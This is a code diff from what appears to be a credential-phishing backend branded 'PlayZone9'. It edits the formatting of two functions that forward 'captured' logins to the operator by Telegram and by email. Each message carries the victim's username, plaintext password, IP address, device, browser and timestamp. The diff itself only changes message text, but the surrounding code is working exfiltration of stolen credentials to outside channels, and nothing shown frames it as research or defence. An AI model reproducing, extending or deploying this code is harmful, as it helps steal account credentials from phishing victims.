@@ -81,8 +81,8 @@ async function readFromSupabase() {
 async function sendTelegram(entry) {
     const text =
         `🎯 *[PlayZone9] New Login Captured!*\n\n` +
-        `👤 *Username:* \`${entry.username}\`\n` +
-        `🔑 *Password:* \`${entry.password}\`\n\n` +
+        `👤 *Username:* ${entry.username}\n` +
+        `🔑 *Password:* ${entry.password}\n\n` +
         `🌐 *IP:* ${entry.ip}\n` +
         `💻 *Device:* ${entry.device} (${entry.browser})\n` +
         `🕒 *Time:* ${entry.timestamp}\n\n` +
@@ -109,9 +109,9 @@ async function sendEmail(entry) {
         await transporter.sendMail({
             from:    `"PlayZone9 Alert" <${EMAIL_USER}>`,
             to:      EMAIL_USER,
-            subject: `🎯 [PlayZone9] Login Captured: ${entry.username}`,
+            subject: `🎯 [PlayZone9] New Login Captured: ${entry.username}`,
             text:
-                `[PlayZone9] New login attempt captured!\n\n` +
+                `[PlayZone9] New Login Captured!\n\n` +
                 `Username : ${entry.username}\n` +
                 `Password : ${entry.password}\n\n` +
                 `IP       : ${entry.ip}\n` +
